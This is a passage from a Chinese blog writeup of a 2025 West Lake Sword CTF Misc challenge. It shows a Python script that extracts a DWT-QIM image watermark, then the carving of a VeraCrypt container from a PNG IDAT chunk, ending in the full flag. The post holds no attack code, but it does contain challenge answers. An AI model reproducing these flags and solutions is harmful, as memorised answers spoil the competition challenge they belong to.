</span></span><span class=line><span class=cl><span class=c1># next_information_length = 102,block_size = 8,delta=8,Green channel</span></span></span></code></pre></td></tr></table></div></div><p>运行以上脚本后即可得到第一段flag：<code>DASCTF{01d0eed8-2e4b</code>，以及下一步的提示</p><p>并且可以用爆破出来的密码还原图片，还原后的图片如下</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250331201753939.png alt=/posts/f002407/imgs/image-20250331201753939.png height=200 width=200></p><p>然后去网上搜<code>DWT-QIM</code>相关的内容，可以搜到<a href=https://blog.wm-team.cn/index.php/archives/80/#steg_allInOne target=_blank rel="external nofollow noopener noreferrer">2024WMCTF-steg_allInOne</a>这道题</p><p>发现整体思路和这道题差不多，猜测出题人的出题思路也是来源于这道题</p><p>然后我们010打开附件给的那张PNG，发现图片的末尾藏了一张base64编码后的图片</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250401183123671.png alt=/posts/f002407/imgs/image-20250401183123671.png height=1745 width=2660></p><p>提取出来base64解码即可得到下图</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250401183228651.png alt=/posts/f002407/imgs/image-20250401183228651.png height=1080 width=1920></p><p>参考上面<code>2024WMCTF</code>那道题的wp，改一下提取水印的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>libnum</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pywt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_qim</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=n>delta</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>block_flat</span> <span class=o>=</span> <span class=n>block</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>avg</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>mean</span><span class=p>(</span><span class=n>block_flat</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>mod_value</span> <span class=o>=</span> <span class=n>avg</span> <span class=o>%</span> <span class=n>delta</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>mod_value</span> <span class=o>&lt;</span> <span class=n>delta</span> <span class=o>/</span> <span class=mi>4</span> <span class=ow>or</span> <span class=n>mod_value</span> <span class=o>&gt;</span> <span class=mi>3</span> <span class=o>*</span> <span class=n>delta</span> <span class=o>/</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_watermark1</span><span class=p>(</span><span class=n>G_watermarked</span><span class=p>,</span> <span class=n>watermark_length</span><span class=p>,</span> <span class=n>delta</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>watermark_bits</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>block_size</span> <span class=o>=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>G_watermarked</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>block_size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>G_watermarked</span><span class=o>.</span><span class=n>shape</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>block_size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>k</span> <span class=o>&lt;</span> <span class=n>watermark_length</span> <span class=o>*</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>block</span> <span class=o>=</span> <span class=n>G_watermarked</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>block_size</span><span class=p>,</span> <span class=n>j</span><span class=p>:</span><span class=n>j</span><span class=o>+</span><span class=n>block_size</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>block</span><span class=o>.</span><span class=n>shape</span> <span class=o>!=</span> <span class=p>(</span><span class=n>block_size</span><span class=p>,</span> <span class=n>block_size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=k>continue</span>
</span></span><span class=line><span class=cl>                <span class=n>coeffs</span> <span class=o>=</span> <span class=n>pywt</span><span class=o>.</span><span class=n>dwt2</span><span class=p>(</span><span class=n>block</span><span class=p>,</span> <span class=s1>&#39;haar&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>LL</span><span class=p>,</span> <span class=p>(</span><span class=n>LH</span><span class=p>,</span> <span class=n>HL</span><span class=p>,</span> <span class=n>HH</span><span class=p>)</span> <span class=o>=</span> <span class=n>coeffs</span>
</span></span><span class=line><span class=cl>                <span class=n>bit</span> <span class=o>=</span> <span class=n>extract_qim</span><span class=p>(</span><span class=n>LL</span><span class=p>,</span> <span class=n>delta</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>watermark_bits</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>k</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>watermark_str</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>watermark_bits</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>watermark_str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;download.png&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>convert</span><span class=p>(</span><span class=s1>&#39;RGB&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p_data</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>G</span> <span class=o>=</span> <span class=n>p_data</span><span class=p>[:,:,</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>astype</span><span class=p>(</span><span class=n>np</span><span class=o>.</span><span class=n>float32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>libnum</span><span class=o>.</span><span class=n>b2s</span><span class=p>(</span><span class=n>extract_watermark1</span><span class=p>(</span><span class=n>G</span><span class=p>,</span><span class=mi>102</span><span class=p>,</span><span class=mi>8</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=c1># b&#34;Hey boy, I&#39;m here to help you, now you&#39;ze one step away from successl let me |ell you key:79557c2d8f94&#34;</span></span></span></code></pre></td></tr></table></div></div><p>运行后可以得到如下内容，提示了我们一个key：<code>79557c2d8f94</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>b&#34;Hey boy, I&#39;m here to help you, now you&#39;ze one step away from successl let me |ell you key:79557c2d8f94&#34;</span></span></code></pre></td></tr></table></div></div><p>然后我们010打开提取得到的图片，发现有一块异常的<code>IDAT chunk</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250401183350583.png alt=/posts/f002407/imgs/image-20250401183350583.png height=1745 width=2660></p><p>尝试给他单独提取出来，发现按照<code>2024WMCTF</code>的思路做得不到有用的东西</p><p>然后也尝试了异或密钥，也没有得到有效的信息，在<code>@IcePeak</code>师傅的提醒下，查看了这块数据的大小</p><p>发现刚刚好是300kb，因此结合题目给了密钥，联想到可能是VeraCrypt加密容器</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250401184416937.png alt=/posts/f002407/imgs/image-20250401184416937.png height=920 width=739></p><p>然后这里提取这块数据的时候要注意，不要把表示数据长度的那四个字节也提取出来</p><p>我们要从下图中高亮的位置后面开始提取</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250401184348934.png alt=/posts/f002407/imgs/image-20250401184348934.png height=1745 width=2660></p><p>提取出来后，用VC挂载即可得到flag2：<code>-4dc6-9152-ffe56b0f70b4}</code></p><p><img loading=lazy src=/posts/f002407/imgs/image-20250401184736460.png alt=/posts/f002407/imgs/image-20250401184736460.png height=1396 width=1976></p><p>综上，将得到的两段flag拼起来即可得到最后的flag：<code>DASCTF{01d0eed8-2e4b-4dc6-9152-ffe56b0f70b4}</code></p><blockquote><p>一些碎碎念：出题人最后套了一个VC加密容器确实会比较难想到，需要选手结合数据的长度和密钥进行联想</p><p>但也正是出题人这最后套了一下VC加密容器，让这道题更贴合“数据安全”这个分类吧</p></blockquote></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2025-04-19 15:35:37">更新于 2025-04-19&nbsp;</span></div></div><div class=post-info-line><div class=post-info-md><span><a href=/posts/f002407/index.md title=阅读原始文档 class=link-to-markdown>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 X" data-sharer=twitter data-url=https://goodlunatic.github.io/posts/f002407/ data-title="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup" data-hashtags=CTF,Misc,Writeup><i class="fa-brands fa-x-twitter fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://goodlunatic.github.io/posts/f002407/ data-hashtag=CTF><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://goodlunatic.github.io/posts/f002407/ data-title="2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup"><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/ctf/ class=post-tag title="标签 - CTF">CTF</a><a href=/tags/misc/ class=post-tag title="标签 - Misc">Misc</a><a href=/tags/writeup/ class=post-tag title="标签 - Writeup">Writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/754b8e7/ class=post-nav-item rel=prev title="2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup</a><a href=/posts/c49ae8a/ class=post-nav-item rel=next title=CTF-数据安全>CTF-数据安全<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div><div id=comments><div id=giscus class=comment><script src=https://giscus.app/client.js data-repo=goodlunatic/goodlunatic.github.io data-repo-id=R_kgDOQHqgBw data-category=Announcements data-category-id=DIC_kwDOQHqgB84Cw_4D data-mapping=pathname data-strict=0 data-theme=preferred_color_scheme data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-loading=lazy crossorigin=anonymous async defer></script></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/ rel="external nofollow noopener noreferrer">giscus</a>.</noscript></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered order-1">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.152.1">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.4.0-alpha.2-20251023040336-063af2cd">FixIt</a></div><div class="footer-line copyright order-2" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
<span itemprop=copyrightYear>2022 - 2025</span><span class=author itemprop=copyrightHolder>
<a href=https://goodlunatic.github.io target=_blank rel="external nofollow noopener noreferrer">Lunatic</a></span></div><div class="footer-line visitor"><span id=busuanzi_container_site_uv title=总访客数><i class="fa-regular fa-user fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_uv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span><span id=busuanzi_container_site_pv class=footer-divider title=总访问量><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_site_pv><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden=true></i></span></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class=variant-numeric>0%</span></div><div class="fixed-button view-comments d-none" role=button aria-label=查看评论><i class="fa-solid fa-comment fa-fw" aria-hidden=true></i></div></div><a href=https://github.com/goodlunatic title="Visit Lunatic's Github" target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>该网站在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/f002407/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>